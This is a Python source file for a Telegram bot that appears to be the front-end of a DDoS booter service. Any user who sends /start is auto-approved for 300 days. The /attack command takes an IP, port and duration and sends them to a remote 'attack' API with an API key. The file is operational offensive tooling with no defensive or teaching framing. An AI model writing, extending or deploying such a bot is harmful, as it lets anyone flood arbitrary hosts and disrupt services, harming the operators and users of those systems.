import asyncio
import logging
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import pymongo
from pymongo import MongoClient
import uuid
import os
from dotenv import load_dotenv

# ================== CONFIG ==================
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI")
API_URL = os.getenv("API_URL")
API_KEY = os.getenv("API_KEY")

# ================== DATABASE ==================
client = MongoClient(MONGODB_URI)
db = client["attack_bot"]
users = db["users"]

def get_time():
    return datetime.now(timezone.utc)

def get_user(user_id):
    return users.find_one({"user_id": user_id})

def create_user(user_id, username):
    if not get_user(user_id):
        users.insert_one({
            "user_id": user_id,
            "username": username,
            "approved": True,
            "expires_at": get_time() + timedelta(days=300)
        })

def is_approved(user_id):
    user = get_user(user_id)
    if not user:
        return False
    return user["expires_at"] > get_time()

# ================== API FIXED ==================
def safe_json(response):
    if not response.text.strip():
        return {"success": False, "error": "Empty API response"}
    try:
        return response.json()
    except:
        return {"success": False, "error": response.text[:200]}

def launch_attack(ip, port, duration):
    try:
        res = requests.post(
            f"{API_URL}/api/v1/attack",
            json={"ip": ip, "port": port, "duration": duration},
            headers={"x-api-key": API_KEY},
            timeout=15
        )

        print("STATUS:", res.status_code)
        print("RESPONSE:", res.text)

        return safe_json(res)

    except Exception as e:
        return {"success": False, "error": str(e)}

# ================== COMMANDS ==================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    create_user(user.id, user.username)

    await update.message.reply_text(
        f"✅ Welcome {user.username}\n\n"
        f"🚀 Auto Approved for 300 days\n\n"
        f"/attack ip port duration"
    )

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if not is_approved(user_id):
        await update.message.reply_text("❌ Not approved")
        return

    if len(context.args) != 3:
        await update.message.reply_text("❌ Usage: /attack ip port duration")
        return

    ip = context.args[0]
    port = int(context.args[1])
    duration = int(context.args[2])

    msg = await update.message.reply_text("🚀 Attacking...")

    result = launch_attack(ip, port, duration)

    if result.get("success"):
        await msg.edit_text("✅ Attack Sent Successfully")
    else:
        await msg.edit_text(f"❌ Failed:\n{result.get('error')}")

async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = get_user(update.effective_user.id)
    await update.message.reply_text(str(user))

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "/attack ip port duration\n/myinfo"
    )

# ================== MAIN ==================
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("myinfo", myinfo))
    app.add_handler(CommandHandler("help", help_cmd))

    print("✅ Bot Running...")
    app.run_polling()

if __name__ == "__main__":
    main()
